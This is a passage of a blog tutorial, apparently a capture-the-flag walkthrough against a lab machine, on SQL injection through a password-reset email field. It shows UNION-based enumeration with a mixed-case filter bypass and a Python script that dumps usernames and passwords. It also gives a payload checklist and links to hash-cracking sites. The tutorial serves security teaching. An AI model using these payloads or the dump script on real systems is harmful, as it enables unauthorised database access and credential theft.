+<p>By sending &ldquo;<a href="mailto:test@test.com">test@test.com</a>&rdquo; a different error is prompted - &ldquo;user not found&rdquo;. Ok, great, we can perform user enumeration.</p>
+<p><img src="/sqli-0x02/21_user_enum.png" alt="User Enumeration Possible"></p>
+<p>Now that the validation requirement is met, let&rsquo;s try sending special SQL characters like the ones stated above to test it out.</p>
+<h3 id="vulnerability-testing-1">Vulnerability Testing</h3>
+<p>I&rsquo;ll be showing the screenshots of BurpSuite Repeater since the data sent in the POST request is not visible on the webpage.</p>
+<ol>
+<li>Single-quote - <code>'</code>
+Appending a single-quote to an email address and sending that to the server</li>
+</ol>
+<p><img src="/sqli-0x02/22_err_db_req.png" alt="A New Error"></p>
+<p>By sending a single-quote, we are presented with a new error which clearly states that the query caused an error in the database. A good sign.</p>
+<ol start="2">
+<li>Semi-colon - <code>;</code>
+Appending a semi-colon to an email address and sending that to the server</li>
+</ol>
+<p><img src="/sqli-0x02/23_semi_colon_test.png" alt="User Not Found"></p>
+<p>By sending a semi-colon, a db error wasn&rsquo;t presented but rather a &ldquo;user not found&rdquo; error. This indicates that even though the query may be getting terminated, it is working just as intended.</p>
+<ol start="3">
+<li>Comments - <code>-- -</code>
+Appending a comment to an email address and sending that to the server</li>
+</ol>
+<p><img src="/sqli-0x02/24_comments.png" alt="User Not Found"></p>
+<p>By sending a comment, a db error wasn&rsquo;t presented but rather a &ldquo;user not found&rdquo; error. This indicates that even though the rest of the query may be getting terminated, it is working just as intended.</p>
+<p>We saw that when we used a single-quote we were presented with a database error, probably so because an extra quote was present in the final query that was passed onto the database for execution. What if a single-quote was used and a comment was appended to it?</p>
+<p><img src="/sqli-0x02/24_quote_comment.png" alt="User Not Found"></p>
+<p>We can say that we have successfully injected single-quote and a comment in the query.</p>
+<ol start="4">
+<li>AND operator
+When a string is passed onto a query, you always have to end it with a single-quote since you&rsquo;re appending additional SQL parameters.</li>
+</ol>
+<p>To perform an <code>AND</code> test here, we add a single-quote which the PHP would have done for ourselves since it&rsquo;s a string. Then we add the AND operator and put our conditions in single-quotes to except the last one which we&rsquo;ll let the PHP code add for us.</p>
+<p><img src="/sqli-0x02/25_and.png" alt="User Not Found"></p>
+<p>Although 1=1 is <code>true</code>, the earlier part of the condition is false and so we got the <code>false</code> result, and so this test also printed out the same error.</p>
+<ol start="5">
+<li>OR operator
+Similar to the previous test, we send a request replacing &ldquo;AND&rdquo; with &ldquo;OR&rdquo;</li>
+</ol>
+<p><img src="/sqli-0x02/26_or.png" alt="User Not Found"></p>
+<p>Surprinsingly this printed the same error instead of saying that it found a user. This was surprising because we were able to inject single-quotes into the query.</p>
+<ol start="6">
+<li>Sleep
+We&rsquo;ll append a <code>sleep</code> command along with an operator either <code>AND</code> or <code>OR</code> and wait for those many seconds to get the response back.
+The request I sent for testing was:</li>
+</ol>
+<pre  class="mc-prism hide language-text" ><code>email=test%40test.com'+AND+sleep(5);--+-
+</code></pre>
+<p>Unfortunately the responses were received right away. Sleep test did not turn out as expected.</p>
+<p>So far we know that we were successfully able to inject a single-quote and a comment. Let&rsquo;s build a little on that to see if we could actually inject and gain something useful out of it.</p>
+<h4 id="number-of-columns-1">Number Of Columns</h4>
+<p>This process as such comes under the enumeration part of the exploitation of SQL injection, but it can also act as a sure indicator that we actually can perform injections. If we can enumerate number of columns present in this table we can go further.</p>
+<p>Unlike last time, let&rsquo;s use another method to get the number of columns - <code>ORDER BY</code>.
+In <code>UNION</code>, you are presented with an error till the number of columns in the table and the columns in your SELECT statement are not equal, you combine two tables into one.
+In <code>ORDER BY</code>, you get an error when the number of columns in your &ldquo;order by&rdquo; clause is more than the number of columns in the table, you sort the output of the entire query as per a column.
+Just like UNION, ORDER BY can also work on the basis of index of the column and you need not know the column names beforehand.</p>
+<p>Each table that exists, has to have atleast two columns, one is &ldquo;id&rdquo;, another could be anything. This table could potentially have four columns. One has to be &ldquo;id&rdquo;, for login functionality it requires &ldquo;username&rdquo; and &ldquo;password&rdquo;, and for reset it requires &ldquo;email&rdquo;. But let&rsquo;s start from column one anyway.</p>
+<p>Request sent:</p>
+<pre  class="mc-prism hide language-text" ><code>email=test%40test.com'+ORDER+BY+1;--+-
+</code></pre>
+<p><img src="/sqli-0x02/27_orderby_1.png" alt="Ordered By Column 1"></p>
+<p>Ok, it has one column, let&rsquo;s check if it has more. We&rsquo;ll append a number and then repeat the earlier request till we get some sort of error.</p>
+<p><img src="/sqli-0x02/27_orderby_2.png" alt="ORDER BY Column Error"></p>
+<p>As we repeat the process, we encounter an error when we try to sort the output of the table as per column #5. This indicates that we actually do have an injectable parameter which we can proceed with, and also that the table has only four columns to work with.</p>
+<h3 id="vulnerability-exploitation---union-attacks">Vulnerability Exploitation - UNION Attacks</h3>
+<h4 id="backend-query-1">Backend Query</h4>
+<p>Since this functionality is taking in email address and checking if the username is found, let&rsquo;s estimate a query that the backend PHP code is using</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT username FROM users WHERE email = 'user_input';
+</code></pre>
+<h4 id="number-of-columns-2">Number of Columns</h4>
+<p>Our next step would have been to find the number of columns which we already did earlier (using <code>ORDER BY</code>), finding four columns, but we did not determine which column number is printable, so let&rsquo;s do that.</p>
+<p>To find a printable column, we&rsquo;ll need to use a <code>UNION</code> clause. We can send the same request as the ORDER BY clause, replacing &ldquo;ORDER BY&rdquo; with &ldquo;UNION SELECT&rdquo;</p>
+<p>Request sent:</p>
+<pre  class="mc-prism hide language-text" ><code>email=test%40test.com'+UNION+SELECT+1,2,3,4;--+-
+</code></pre>
+<p><img src="/sqli-0x02/28_union_1.png" alt="UNION Error"></p>
+<p>A high possibility that &ldquo;UNION&rdquo; is blocked, as that is often seen as &ldquo;hacking attempt&rdquo; while usage of &ldquo;SELECT&rdquo; looks benign.</p>
+<p>In order to bypass that we could try using mixed-case UNION - &ldquo;UnIoN&rdquo;</p>
+<p>Request sent:</p>
+<pre  class="mc-prism hide language-text" ><code>email=test%40test.com'+UnIoN+SELECT+1,2,3,4;--+-
+</code></pre>
+<p><img src="/sqli-0x02/28_union_2.png" alt="Blocklist Bypassed"></p>
+<p>The error changed, it seems that one of columns from the UNION clause is trying to get printed, but it requires it to be as per the email validation. Let&rsquo;s test which column is of email by sending &ldquo;<a href="mailto:a@b.com">a@b.com</a>&rdquo; in place of the numbers one at a time.</p>
+<p>Setting first column as an &ldquo;email&rdquo;</p>
+<p><img src="/sqli-0x02/28_union_3.png" alt="Incorrect Format"></p>
+<p>We&rsquo;ll repeat this, and soon find out that the fourth column is that of email</p>
+<p><img src="/sqli-0x02/28_union_4.png" alt="Found The Right Column"></p>
+<p>Not only did we meet the email requirement of our new SELECT statement, but also found the column which is printable!</p>
+<h3 id="enumerating-database-1">Enumerating Database</h3>
+<p>Printing out information in this would a little tricky as we have to maintain the email format to meet the validation requirement.</p>
+<p>Let&rsquo;s start by printing out the name of the database we are using.</p>
+<p>Request sent:</p>
+<pre  class="mc-prism hide language-text" ><code>test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT(database(),&quot;@b.com&quot;);--+-
+</code></pre>
+<p>Output:</p>
+<p><img src="/sqli-0x02/29_db_1.png" alt="Database"></p>
+<p>The database we are using is &ldquo;supercms&rdquo;.</p>
+<p>Although we can read the output, it does not look very accessible as it is appended to the email part of our concatenation. It is doable, but we can do better.</p>
+<p>Request sent:</p>
+<pre  class="mc-prism hide language-text" ><code>test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT(&quot;\r\n&quot;,database(),&quot;\r\n&quot;,&quot;@b.com&quot;);--+-
+</code></pre>
+<p>Output:</p>
+<p><img src="/sqli-0x02/29_db_2.png" alt="Database Better"></p>
+<p>Printing all our information out on a new line looks much better.</p>
+<p>Let&rsquo;s take a look at the user we are running as:</p>
+<p><img src="/sqli-0x02/30_db_user.png" alt="DB User"></p>
+<p>We are running as &ldquo;supercms@localhost&rdquo;. Not so useful, let&rsquo;s move on.</p>
+<h3 id="enumerating-tables-1">Enumerating Tables</h3>
+<p>Let&rsquo;s take a count of the tables that exist in the current database we&rsquo;re using.</p>
+<p>Request:</p>
+<pre  class="mc-prism hide language-text" ><code>test@test.com' UnIoN SELECT 1,2,3,CONCAT('\r\n',count(table_name),'\r\n','@test.com') FROM information_schema.tables WHERE table_schema=database()-- -
+</code></pre>
+<p><img src="/sqli-0x02/31_count_tables.png" alt="Counting Tables"></p>
+<p>We see that we have three tables in this database, let&rsquo;s list them out.</p>
+<p>Request:</p>
+<pre  class="mc-prism hide language-text" ><code>test@test.com' UnIoN SELECT 1,2,3,CONCAT('\r\n','\r\n',group_concat(0x7c,table_name,0x7c,'\r\n'),'\r\n','@test.com') FROM information_schema.tables WHERE table_schema=database()-- -
+</code></pre>
+<p><img src="/sqli-0x02/32_list_tables.png" alt="Tables List"></p>
+<p>From the output above we can see that we have three tables. Let&rsquo;s see what columns each table has</p>
+<h3 id="enumerating-columns-1">Enumerating Columns</h3>
+<p>Let&rsquo;s look at the columns of the first table - groups</p>
+<p>Request:</p>
+<pre  class="mc-prism hide language-text" ><code>test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',group_concat(0x7c,column_name,0x7c,'\r\n'),'\r\n','%40test.com')+FROM+information_schema.columns+WHERE+table_name%3d'groups'--+-
+</code></pre>
+<p><img src="/sqli-0x02/33_col1.png" alt="Columns Of Table Groups"></p>
+<p>Let&rsquo;s look at the columns of the second table - license</p>
+<p>Request:</p>
+<pre  class="mc-prism hide language-text" ><code>test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',group_concat(0x7c,column_name,0x7c,'\r\n'),'\r\n','%40test.com')+FROM+information_schema.columns+WHERE+table_name%3d'license'--+-
+</code></pre>
+<p><img src="/sqli-0x02/33_col2.png" alt="Columns Of Table Groups"></p>
+<p>Let&rsquo;s look at the columns of the third table - operators</p>
+<p>Request:</p>
+<pre  class="mc-prism hide language-text" ><code>test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',group_concat(0x7c,column_name,0x7c,'\r\n'),'\r\n','%40test.com')+FROM+information_schema.columns+WHERE+table_name%3d'operators'--+-
+</code></pre>
+<p><img src="/sqli-0x02/33_col3.png" alt="Columns Of Table Groups"></p>
+<p>Out of all the table we enumerated for columns, the &ldquo;operators&rdquo; table seems to have the most interesting columns - username and password.</p>
+<p>Another way that you could enumerate for &ldquo;interesting&rdquo; columns without doing table name or column name enumeration is by using wildcards. You could ask the database to return any column that has a keyword in it, like &ldquo;user&rdquo;. A query to do so would look like this:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT GROUP_CONCAT(column_name,0x3a,table_name,'\r\n') FROM information_schema.columns WHERE column_name like %user%;
+</code></pre>
+<p>In MySQL, you use &ldquo;%&rdquo; as a wildcard in a query. This would print out any column name which has the term &ldquo;user&rdquo; in it (with anything in front or after the term) and its&rsquo; respective table name. Similar could be done for password - &ldquo;%pass%&rdquo;</p>
+<p>Let&rsquo;s try to get all the columns with term &ldquo;user&rdquo; in our example:</p>
+<p>Request:</p>
+<pre  class="mc-prism hide language-text" ><code>test@test.com' UnIoN SELECT 1,2,3,CONCAT('\r\n','\r\n',group_concat(0x7c,column_name,0x3a,table_name,0x7c,'\r\n'),'\r\n','@test.com') FROM information_schema.columns WHERE column_name like '%user%'-- -
+</code></pre>
+<p>Output:</p>
+<p><img src="/sqli-0x02/33_col4.png" alt="Getting &ldquo;username&rdquo; Column With Wildcard"></p>
+<p>Since we used a wildcard, we get the results from any column that has user in it, but it does get things done quicker.</p>
+<h3 id="getting-content">Getting Content</h3>
+<p>Before we dive into dumping information out, it&rsquo;s always a good idea take a count of things. With that said, let&rsquo;s take a count of id of the operators table before we start dumping everything.</p>
+<p>Request:</p>
+<pre  class="mc-prism hide language-text" ><code>test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',count(id),'\r\n','\r\n','%40test.com')+FROM+operators--+-
+</code></pre>
+<p><img src="/sqli-0x02/34_row_count.png" alt="Row Count"></p>
+<p>Dumping 202 entries on the screen would not have been good idea, and there would also be a high chance of not every entry getting printed about on the screen.</p>
+<p>Let&rsquo;s fetch one entry on the screen, and we&rsquo;ll use that as the basis of our script which will fetch everything for us.</p>
+<p>Request:</p>
+<pre  class="mc-prism hide language-text" ><code>test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',__username_,0x3a,__password_,'\r\n','\r\n','%40test.com')+FROM+operators+LIMIT+0,1--+-
+</code></pre>
+<p>Output:</p>
+<p><img src="/sqli-0x02/35_row1.png" alt="First Row Fetched"></p>
+<p>A test account in the first row is odd, and although there&rsquo;s a shortcut here, I&rsquo;ll cover that once we develop a script to fetch all the accounts.</p>
+<p>In the above query I have used &ldquo;LIMIT 0,1&rdquo; to print only 1 row with 0 offset. Offset is the first part, it states which row will it start printing (or SELECTing) from the beginning of the table, the index starts from 0. The second part (&ldquo;1&rdquo;) states how many rows to print (or SELECT) out of the output.</p>
+<p>I&rsquo;ve created a python script that will cycle through all the (202) accounts present here and print out the response on the terminal. This requires additional filtering as it does not print out only the credentials, which is what we care about.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-py">import requests
+
+
+def injection(a):
+    return &quot;test@test.com' UnIoN SELECT 1,2,3,CONCAT('\r\n','\r\n','cred:',__username_,0x3a,__password_,'\r\n','\r\n','@test.com') FROM operators LIMIT %s,1-- -&quot; % a
+
+
+for i in range(0,202):
+    payload = {'email':injection(i)}
+    r = requests.post('http://10.10.10.31/cmsdata/forgot.php', data=payload)
+    print r.text
+</code></pre>
+<p>Explanation of the script:</p>
+<ol>
+<li>In the first time, I imported the requests module of python to perform automated requests</li>
+<li>In the fourth line, I defined an injection function which only returns an injection payload as per the for loop, and changes the OFFSET of the payload with &ldquo;LIMIT 1&rdquo;. This allows us to cycle through the table and print out only one entry per request.
+<ol>
+<li>I&rsquo;ve also added a constant string &ldquo;cred:&rdquo; in the injection payload which will print as a prefix to every credential dumped for processing purposes.</li>
+</ol>
+</li>
+<li>In the eighth line, a for loop is created to cycle through all the accounts present in the database.</li>
+<li>In the ninth line, email payload is set to be sent in the POST request</li>
+<li>In the tenth line, a request is sent to the required host along with necessary data which we defined above. All of that requests data is assigned to a variable to do further processing on it.</li>
+<li>In the last line we are printing out the response on the terminal</li>
+</ol>
+<p>To ensure that the script is running in the first place and as expected we first send only one request (keeping range(0,1)), and check the response.</p>
+<p><img src="/sqli-0x02/35_row_auto1.png" alt="SQLi Requester"></p>
+<p>Output:</p>
+<p><img src="/sqli-0x02/35_row_auto2.png" alt="Test Response OK"></p>
+<p>Response comes exactly as expected, but it requires processing. We can use <code>grep</code> and <code>cut</code> commands to get the useful output.</p>
+<p>Command used:</p>
+<pre  class="mc-prism hide language-text" ><code>python sqli_charon.py | grep &quot;cred:&quot; | cut -d&quot;:&quot; -f2,3
+</code></pre>
+<p>Output:</p>
+<p><img src="/sqli-0x02/35_row_auto3.png" alt="Response Processed"></p>
+<p>Perfect, let&rsquo;s get them all and save them in a file</p>
+<p><img src="/sqli-0x02/35_row_auto4.png" alt="Saved Credentials"></p>
+<p>As shown above, we were able to get all the credentials that was present in the operators table.</p>
+<p>This is not the only way to automate this process, and I&rsquo;d like to encourage you to come up with different ways to do the same as a fun learning exercise.</p>
+<p>The shortcut way to do this would again be using wildcards. Since we know that there are test accounts present in this table to waste our time, we could ask the database to get the count of rows which does not have a username with &ldquo;test&rdquo; in it.</p>
+<p>Query:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT 1,2,3,CONCAT('\r\n',count(id),'\r\n','@test.com') FROM operators WHERE __username_ NOT like 'test%'-- -
+</code></pre>
+<p>Request:</p>
+<pre  class="mc-prism hide language-text" ><code>test%40abcd.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n',count(id),'\r\n','%40test.com')+FROM+operators+WHERE+__username_+NOT+like+'test%25'--+-
+</code></pre>
+<p><img src="/sqli-0x02/36_real1.png" alt="Real Accounts Count"></p>
+<p>Out of 202 rows in the table, 200 were fake accounts, and just two useful accounts.</p>
+<p>As a sidenote, if you&rsquo;d like to crack hashes you got via some SQL injection or some another way, it is a good idea to first try to crack them online. It not only saves you time but also resources.</p>
+<ol>
+<li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
+<li><a href="https://hashes.org/search.php">https://hashes.org/search.php</a></li>
+<li><a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a></li>
+</ol>
+<h2 id="summary">Summary</h2>
+<p>To summarize the post:</p>
+<ol>
+<li>To start with testing for SQL injection points, it&rsquo;s necessary to sift through the application and make note of all the user input fields and parameters.</li>
+<li>Each parameter and input field must be tested individually.</li>
+<li>Send SQL specific characters to cause an error in the query generation that will lead to database causing an error.</li>
+<li>Look for changes in the webpage of error per parameter/input test</li>
+</ol>
+<p><strong>Testing checklist</strong>:</p>
+<table class="mc-table">
+<thead>
+<tr>
+<th>Name</th>
+<th>Character</th>
+<th>Function</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Single quote</td>
+<td><code>'</code></td>
+<td>String terminator</td>
+</tr>
+<tr>
+<td>Semi colon</td>
+<td><code>;</code></td>
+<td>Query terminator</td>
+</tr>
+<tr>
+<td>Comment</td>
+<td><code>-- -</code></td>
+<td>Removing rest of the query</td>
+</tr>
+<tr>
+<td>Single quote with a comment</td>
+<td><code>'-- -</code></td>
+<td>End a string and remove rest of the query</td>
+</tr>
+<tr>
+<td>Single quote, semi colon and a comment</td>
+<td><code>';-- -</code></td>
+<td>End a string, end query, and remove rest of the query</td>
+</tr>
+<tr>
+<td>OR operator</td>
+<td><code>OR 1=1-- -</code></td>
+<td>For integers, <code>true</code> test</td>
+</tr>
+<tr>
+<td>OR operator</td>
+<td><code>OR 1=2-- -</code></td>
+<td>For integers, <code>false</code> test</td>
+</tr>
+<tr>
+<td>OR operator</td>
+<td><code>' OR '1'='1'-- -</code></td>
+<td>For strings, <code>test</code> test</td>
+</tr>
+<tr>
+<td>AND operator</td>
+<td><code>AND 1=1-- -</code></td>
+<td>For integers, <code>true</code> test</td>
+</tr>
+<tr>
+<td>AND operator</td>
+<td><code>AND 1=2-- -</code></td>
+<td>For integers, <code>false</code> test</td>
+</tr>
+<tr>
+<td>AND operator</td>
+<td><code>' AND '1'='1'-- -</code></td>
+<td>For strings, <code>true</code> test</td>
+</tr>
+<tr>
+<td>Sleep function</td>
+<td><code>OR sleep(5)-- -</code></td>
+<td>Blind test</td>
+</tr>
+</tbody>
+</table>
+<p><strong>UNION attack hack steps</strong>:</p>
+<ol>
+<li>Use mixed case in case of some filtering</li>
+<li>Use &ldquo;ORDER BY&rdquo; to get the number of columns</li>
+<li>Find printable columns</li>
+<li>Get &ldquo;version()&rdquo;</li>
+<li>Get count of tables in your &ldquo;database()&rdquo;</li>
+<li>Get tables in your &ldquo;database()&rdquo;</li>
+<li>Get count of columns per table</li>
+<li>Get interesting columns</li>
+<li>Get count of rows per interesting table</li>
+<li>Get data</li>
+<li>Automate queries</li>
+</ol>
+<h2 id="fin">Fin</h2>
+<p>If you would like to learn more, you can move on to the third post - <a href="/sqli-0x03">SQL Injection 0x03 - Blind Boolean Attacks</a></p>
+<p>If some part of this post feels unexplained or you did not understand, feel free to contact me :)
+Have a great day, take care, and hack the planet!</p>
+
+</article>
+</div>
+
+
+                
+                    <div class="content-margin">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "n00bsec" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+                
+            </div>
+<footer>
+    <article>Made with love...and copious amounts of coffee</article>
+</footer>
+
+</main>
+    </body>
+</html>
